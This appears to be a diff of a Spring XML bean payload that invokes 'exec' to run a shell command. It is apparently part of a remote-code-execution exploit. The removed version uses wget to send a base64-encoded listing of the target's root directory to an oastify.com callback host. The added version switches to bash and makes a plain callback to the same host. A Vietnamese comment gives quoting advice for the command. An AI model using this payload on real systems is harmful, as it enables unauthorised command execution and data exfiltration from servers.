@@ -12,10 +12,9 @@
     <property name="targetMethod" value="exec"/>
     <property name="arguments">
       <list>
-        <value>sh</value>
+        <value>bash</value>
         <value>-c</value>
-        <!-- không thêm dấu ' quanh lệnh -->
-        <value><![CDATA[wget http://ra5vyglp45s5osa5xo77jhuy4pagyamz.oastify.com?c=$(ls /|base64 -w0)]]></value>
+        <value><![CDATA[wget http://ra5vyglp45s5osa5xo77jhuy4pagyamz.oastify.com]]></value>
       </list>
     </property>
   </bean>
